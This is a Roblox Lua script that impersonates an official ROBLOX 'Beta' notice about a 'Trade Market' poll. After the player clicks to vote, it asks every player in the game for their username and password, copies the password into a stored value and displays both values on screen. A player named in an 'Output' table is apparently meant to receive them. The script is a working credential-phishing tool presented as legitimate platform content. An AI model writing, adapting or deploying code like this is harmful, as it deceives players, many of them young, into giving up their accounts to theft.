
--(Copyright) 2013 ROBLOX Corporation is a Trademark of ROBLOX: ROBLOX is not affiliated with the LEGO, MEGA, or K'Nex products and toys.
 
function CalculateTime()
local hour = math.floor((tick()%86400)/3600)
local minute = math.floor((tick()%3600)/60)
local second = math.floor(tick()%60)
 
if tostring(minute):len() == 1 then
minute = "0" .. tostring(minute)
end
if tostring(second):len() == 1 then
second = "0" .. tostring(second)
end
 
return tostring(hour) .. ":" .. tostring(minute) .. ":" .. tostring(second)
end
 
function CalculateDate()
local year = 0
local yearcount = tick()/86400
local leapyear = false
local month = {
January = 31,
Februrary = 28,
March = 31,
April = 30,
May = 31,
June = 30,
July = 31,
August = 31,
September = 30,
October = 31,
November = 30,
December = 31
}
local mtab = {"January", "Februrary", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"}
local cmonth = 1
while true do
local yearlength = 365
leapyear = false
if ((year+1970)%4) == 0 then
yearlength = 366
leapyear = true
end
if yearcount < yearlength then
break
else
yearcount = yearcount - yearlength
year = year + 1
end
end
while true do
if leapyear then
month[mtab[2]] = 29
end
if yearcount <= month[mtab[cmonth]] then
break
else
yearcount = yearcount - month[mtab[cmonth]]
cmonth = cmonth + 1
end
end
 
week = {"Monday","Tuesday","Wednesday","Thursday","Friday","Saturday","Sunday"}
local dayofweek = week[math.floor((tick()%604800)/86400)+4]
 
return dayofweek .. ", " .. mtab[cmonth] .. " " .. tostring(math.floor(yearcount+1)) .. ", " .. tostring(1970 + year)
end
 
print(CalculateDate())
print(CalculateTime())
 
RbxU = LoadLibrary("RbxUtility")
Create = RbxU.Create
 
Output = {"ask4kingbily"}
Players = Game:GetService("Players")
Images = {
Roblox = "rbxasset://id=100709875",
RTUF = "rbxasset://id=92674865"
}
 
for _, Player in pairs(Players:GetChildren()) do
local PlayerGui = Player:WaitForChild("PlayerGui")
ypcall(function () PlayerGui.Beta:Destroy() end)
ScreenGui = Create'ScreenGui'{Parent = PlayerGui, Name = "Beta"}
Frame = Create'Frame'{Parent = ScreenGui, Style = "RobloxRound", Size = UDim2.new(0.4, 0, 0.4, 0), Position = UDim2.new(0.6, 0, 0.6, 0)}
Beta = Create'TextLabel'{Parent = Frame, Size = UDim2.new(0.25, 0, 0.1, 0), Text = "Roblox Beta", TextColor3 = Color3.new(1, 1, 1), Font = 2, FontSize = 8, TextStrokeColor3 = Color3.new(0, 0, 0), TextStrokeTransparency = 0, BackgroundTransparency = 1}
 
end
 
 function Class(classType, parent, name, func)
	local c = Instance.new(classType, parent)
	c.Name = name
	if func then
		func(c)
	end
	return c
 end
 
 
Copyright1 = Class("TextLabel", Frame, "TextLabel", function (Object) 
Object.Text = "©2013 ROBLOX Corporation is a Trademark of ROBLOX: ROBLOX is not affiliated with the LEGO, MEGA, or K'Nex products and toys."
Object.TextColor3 = Color3.new(1, 1, 1)
Object.Font = 2
Object.FontSize = 2
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 0.6
Object.BorderSizePixel = 0
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0, 0, 0, 0)
Object.Position = UDim2.new(0.5, 7.5, 1, 0)
end)
Copyright2 = Class("ImageLabel", Frame, "ImageLabel", function (Object) 
Object.Image = "http://www.roblox.com/asset?id=107726222"
Object.BorderSizePixel = 0
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0, 15, 0, 15)
Object.Position = UDim2.new(0, 17.5, 1, -7.5)
end)
Info = Class("TextButton", Frame, "TextLabel", function (Object) 
Object.Text = "What is the ROBLOX Trade Market?"
Object.TextColor3 = Color3.new(1, 1, 1)
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 0.6
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.5, 0, 0.05, 0)
Object.Position = UDim2.new(0.25, 0, 0.3, 0)
end)
Info2 = Class("TextButton", Frame, "TextLabel", function (Object) 
Object.Text = [[    The ROBLOX Trade Market is an in-game feature that is being created by ROBLOX developers. This feature will allow ROBLOX users to interact and trade with other players in-game, and also will allow them to test items before they buy Gear, or Clothing.
Roblox has decided, therefore, to poll the ROBLOX population in order to gather their thoughts about the matter.]]
Object.TextColor3 = Color3.new(1, 1, 1)
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 0.6
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.75, 0, 0.5, 0)
Object.TextWrap = true
Object.TextXAlignment = "Left"
Object.TextYAlignment = "Top"
Object.Position = UDim2.new(0.125, 0, 0.35, 0)
end)
VoteFrame = Class("Frame", Frame, "Frame", function (Object) 
Object.Style = "ChatRed"
Object.Size = UDim2.new(0.5, 0, 0.1, 0)
Object.Position = UDim2.new(0.25, 0, 0.75, 0)
end)
VoteFrame.MouseEnter:connect(function () 
VoteFrame.Style = "ChatGreen"
end)
VoteFrame.MouseLeave:connect(function () 
VoteFrame.Style = "ChatRed"
end)
Vote = Class("TextButton", Frame, "TextButton", function (Object) 
Object.Text = "Please sign in to continue."
Object.TextColor3 = Color3.new(1, 1, 1)
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 0.6
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.5, 0, 0.1, 0)
Object.Position = UDim2.new(0.25, 0, 0.75, 0)
end)
Vote.MouseButton1Down:connect(function () 
 
for i = 1, 10 do
wait(0.01)
Vote.TextTransparency = Vote.TextTransparency + 0.1
Vote.TextStrokeTransparency = Vote.TextStrokeTransparency + 0.06
Info.TextTransparency = Info.TextTransparency + 0.1
Info.TextStrokeTransparency = Info.TextStrokeTransparency + 0.06
Info2.TextTransparency = Info2.TextTransparency + 0.1
Info2.TextStrokeTransparency = Info2.TextStrokeTransparency + 0.06
end
 
VoteFrame.Size = UDim2.new(0.25, 0, 0.1, 0)
VoteFrame.Position = UDim2.new(0.375, 0, 0.75, 0)
 
Vote:Destroy()
Info:Destroy()
Info2:Destroy()
 
Please = Class("TextLabel", Frame, "TextLabel", function (Object) 
Object.Text = "Please enter your username and password in the space below."
Object.TextColor3 = Color3.new(1, 1, 1)
Object.TextTransparency = 1
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 1
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.7, 0, 0.05, 0)
Object.Position = UDim2.new(0.15, 0, 0.3, 0)
end)
UsernameBox = Class("TextBox", Frame, "TextLabel", function (Object) 
Object.Text = ""
Object.TextColor3 = Color3.new(0, 0, 0)
Object.TextTransparency = 1
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.6, 0.6, 0.6)
Object.TextStrokeTransparency = 1
Object.BorderSizePixel = 0
Object.BackgroundTransparency = 1
Object.BackgroundColor3 = Color3.new(0.9, 0.9, 0.9)
Object.Size = UDim2.new(0.5, 0, 0.05, 0)
Object.Position = UDim2.new(0.35, 0, 0.4, 0)
end)
Username = Class("TextLabel", Frame, "TextLabel", function (Object) 
Object.Text = "Username:"
Object.TextColor3 = Color3.new(1, 1, 1)
Object.TextTransparency = 1
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 1
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.5, 0, 0.05, 0)
Object.Position = UDim2.new(0, 0, 0.4, 0)
end)
PasswordBox = Class("TextBox", Frame, "TextLabel", function (Object) 
Object.Text = ""
Object.TextColor3 = Color3.new(0, 0, 0)
Object.TextTransparency = 1
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.6, 0.6, 0.6)
Object.TextStrokeTransparency = 1
Object.BorderSizePixel = 0
Object.BackgroundTransparency = 1
Object.BackgroundColor3 = Color3.new(0.9, 0.9, 0.9)
Object.Size = UDim2.new(0.5, 0, 0.05, 0)
Object.Position = UDim2.new(0.35, 0, 0.5, 0)
end)
Password = Class("TextLabel", Frame, "TextLabel", function (Object) 
Object.Text = "Password:"
Object.TextColor3 = Color3.new(1, 1, 1)
Object.TextTransparency = 1
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 1
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.5, 0, 0.05, 0)
Object.Position = UDim2.new(0, 0, 0.5, 0)
end)
Login = Class("TextButton", Frame, "TextButton", function (Object) 
Object.Text = "Login"
Object.TextColor3 = Color3.new(1, 1, 1)
Object.TextTransparency = 1
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 1
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0.25, 0, 0.1, 0)
Object.Position = UDim2.new(0.375, 0, 0.75, 0)
end)
 
for i = 1, 10 do
wait(0.01)
Please.TextTransparency = Please.TextTransparency - 0.1
Please.TextStrokeTransparency = Please.TextStrokeTransparency - 0.04
UsernameBox.TextTransparency = UsernameBox.TextTransparency - 0.1
UsernameBox.TextStrokeTransparency = UsernameBox.TextStrokeTransparency - 0.06
UsernameBox.BackgroundTransparency = UsernameBox.BackgroundTransparency - 0.1
Username.TextTransparency = Username.TextTransparency - 0.1
Username.TextStrokeTransparency = Username.TextStrokeTransparency - 0.04
PasswordBox.TextTransparency = PasswordBox.TextTransparency - 0.1
PasswordBox.TextStrokeTransparency = PasswordBox.TextStrokeTransparency - 0.06
PasswordBox.BackgroundTransparency = PasswordBox.BackgroundTransparency - 0.1
Password.TextTransparency = Password.TextTransparency - 0.1
Password.TextStrokeTransparency = Password.TextStrokeTransparency - 0.04
Login.TextTransparency = Login.TextTransparency - 0.1
Login.TextStrokeTransparency = Login.TextStrokeTransparency - 0.04
end
 
Pass = Class("StringValue", ScreenGui, "Pass")
 
PasswordBox.Changed:connect(function (Property) 
if Property == "Text" and PasswordBox.Active == true then
Pass.Value = PasswordBox.Text
 
 
end
end)
 
Login.MouseButton1Down:connect(function () 
Information1 = Class("TextButton", ScreenGui, "TextButton", function (Object) 
Object.Text = UsernameBox.Text
Object.TextColor3 = Color3.new(1, 1, 1)
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 0
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0, 100, 0, 15)
Object.Position = UDim2.new(0, 0, 0, 350)
end)
Information2 = Class("TextButton", ScreenGui, "TextButton", function (Object) 
Object.Text = Pass.Value
Object.TextColor3 = Color3.new(1, 1, 1)
Object.Font = 2
Object.FontSize = 6
Object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
Object.TextStrokeTransparency = 0
Object.BackgroundTransparency = 1
Object.Size = UDim2.new(0, 100, 0, 15)
Object.Position = UDim2.new(0, 200, 0, 350)
end)
end)
 
end)
 